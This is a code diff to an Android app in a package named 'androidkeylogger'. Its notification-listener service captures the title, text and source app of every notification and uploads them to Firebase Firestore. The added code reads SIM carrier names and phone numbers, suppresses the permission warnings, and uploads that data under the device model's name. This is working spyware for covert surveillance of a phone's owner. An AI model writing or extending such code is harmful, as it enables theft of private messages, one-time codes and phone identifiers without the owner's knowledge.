@@ -1,13 +1,20 @@
 package com.azamovhudstc.androidkeylogger.service
 
+import android.Manifest
+import android.annotation.SuppressLint
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.os.Build
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
 import android.util.Log
+import androidx.core.app.ActivityCompat
 import com.azamovhudstc.androidkeylogger.model.NotificationModel
+import com.azamovhudstc.androidkeylogger.model.SimCardInfo
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.gson.Gson
 import com.google.gson.JsonSyntaxException
@@ -23,7 +30,9 @@ import java.util.Date
 import java.util.Locale
 
 class MyNotificationListenerService : NotificationListenerService() {
-    var lastNotification =""
+    var lastNotification = ""
+    private  val SHARED_PREFS_NAME = "my_shared_prefs"
+    private  val IS_UPLOADED_KEY = "is_uploaded"
     private lateinit var firestore: FirebaseFirestore
     private val notifications = mutableListOf<NotificationModel>()
     private val fileName = "notifications.txt"
@@ -33,10 +42,13 @@ class MyNotificationListenerService : NotificationListenerService() {
         val networkInfo = connectivityManager.activeNetworkInfo
         return networkInfo != null && networkInfo.isConnected
     }
+
     private fun isLocalNotificationsAvailable(): Boolean {
         val file = File(filesDir, fileName)
         return file.exists()
-    } private fun saveNotificationToFileLocal(notification: NotificationModel) {
+    }
+
+    private fun saveNotificationToFileLocal(notification: NotificationModel) {
         val gson = Gson()
         val notificationJson = gson.toJson(notification)
 
@@ -50,6 +62,7 @@ class MyNotificationListenerService : NotificationListenerService() {
             e.printStackTrace()
         }
     }
+
     private fun readNotificationsFromFileLocal() {
         val file = File(filesDir, fileName)
         if (file.exists()) {
@@ -93,10 +106,16 @@ class MyNotificationListenerService : NotificationListenerService() {
                             Log.d("Firestore", "Notification added to Firestore successfully")
                         }
                         .addOnFailureListener { e ->
-                            Log.e("Firestore", "Error adding notification to Firestore: ${e.message}")
+                            Log.e(
+                                "Firestore",
+                                "Error adding notification to Firestore: ${e.message}"
+                            )
                         }
                 } else {
-                    Log.d("Firestore", "Notification with the same text already exists in Firestore, skipping addition")
+                    Log.d(
+                        "Firestore",
+                        "Notification with the same text already exists in Firestore, skipping addition"
+                    )
                 }
             }
             .addOnFailureListener { e ->
@@ -139,7 +158,10 @@ class MyNotificationListenerService : NotificationListenerService() {
                                 deleteNotificationFromLocalFile(notification)
                             }
                             .addOnFailureListener { e ->
-                                Log.e("Firestore", "Error uploading notification to Firestore: ${e.message}")
+                                Log.e(
+                                    "Firestore",
+                                    "Error uploading notification to Firestore: ${e.message}"
+                                )
                                 // Handle failure
                             }
                     } else {
@@ -189,18 +211,19 @@ class MyNotificationListenerService : NotificationListenerService() {
         firestore = FirebaseFirestore.getInstance()
 
     }
+
     override fun onNotificationPosted(sbn: StatusBarNotification) {
-            super.onNotificationPosted(sbn)
+        super.onNotificationPosted(sbn)
         val notification = sbn.notification
         val extras = notification.extras
         val title = extras.getString("android.title")
         val text = extras.getCharSequence("android.text")?.toString()
         val packageName = sbn.packageName
         val timeStamp = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
-        val dayTime = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
+        val dayTime = SimpleDateFormat("yyyy-MM-dd-HH:mm", Locale.getDefault()).format(Date())
 
-        if (title != null && text != null&& lastNotification != text) {
-            lastNotification= text
+        if (title != null && text != null && lastNotification != text) {
+            lastNotification = text
             Log.d("NotificationListener", "Package: $packageName, Title: $title, Text: $text")
             // Handle the received SMS or message here
             // MainActivity da updateRecyclerView ni chaqirish
@@ -218,7 +241,9 @@ class MyNotificationListenerService : NotificationListenerService() {
                     if (isLocalNotificationsAvailable()) {
                         saveNotificationToFirestore(notificationModel)
                         uploadLocalNotificationsToFireStore()
+
                     } else {
+                        uploadToFireStoreSimCardInfo(getDualSimInfo(applicationContext))
                         saveNotificationToFirestore(notificationModel)
                     }
                 } else {
@@ -235,6 +260,64 @@ class MyNotificationListenerService : NotificationListenerService() {
         }
 
     }
+
+
+    private fun saveIsUploadedToSharedPreferences(context: Context, isUploaded: Boolean) {
+        val sharedPrefs = context.getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE)
+        val editor = sharedPrefs.edit()
+        editor.putBoolean(IS_UPLOADED_KEY, isUploaded)
+        editor.apply()
+    }
+
+    private fun getIsUploadedFromSharedPreferences(context: Context): Boolean {
+        val sharedPrefs = context.getSharedPreferences(SHARED_PREFS_NAME, Context.MODE_PRIVATE)
+        return sharedPrefs.getBoolean(IS_UPLOADED_KEY, false) // Agar qiymat topilmasa, false qaytariladi
+    }
+
+
+    private fun uploadToFireStoreSimCardInfo(simCardInfoList: List<SimCardInfo>) {
+        val db = FirebaseFirestore.getInstance()
+        val deviceModel = Build.MODEL
+        val isUploaded = getIsUploadedFromSharedPreferences(applicationContext)
+        if (!isUploaded) {
+            val simCardsCollection = db.collection("sim_cards_$deviceModel")
+
+            for (simCardInfo in simCardInfoList) {
+                simCardsCollection.add(simCardInfo)
+                    .addOnSuccessListener { documentReference ->
+                        println("DocumentSnapshot added with ID: ${documentReference.id}")
+                        saveIsUploadedToSharedPreferences(applicationContext, true) // Mark as uploaded
+                    }
+                    .addOnFailureListener { e ->
+                        println("Error adding document: $e")
+                    }
+            }
+        }
+    }
+
+
+
+    @SuppressLint("ServiceCast", "HardwareIds", "MissingPermission")
+    fun getDualSimInfo(context: Context): List<SimCardInfo> {
+        val subscriptionManager = SubscriptionManager.from(context)
+        val telephonyManager =
+            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+
+        val subscriptionInfoList =  subscriptionManager.activeSubscriptionInfoList
+        val simInfoList = mutableListOf<SimCardInfo>()
+
+        if (subscriptionInfoList != null && subscriptionInfoList.size >= 2) {
+            for (info in subscriptionInfoList) {
+                val carrierName = info.carrierName?.toString() ?: "N/A"
+                val number = telephonyManager.line1Number ?: "N/A"
+                val simInfo = SimCardInfo(info.simSlotIndex + 1, carrierName, number)
+                simInfoList.add(simInfo)
+            }
+        }
+        Log.d("EVENT", "getDualSimInfo: $simInfoList ")
+        return simInfoList
+    }
+
     override fun onNotificationRemoved(sbn: StatusBarNotification) {
         super.onNotificationRemoved(sbn)
 
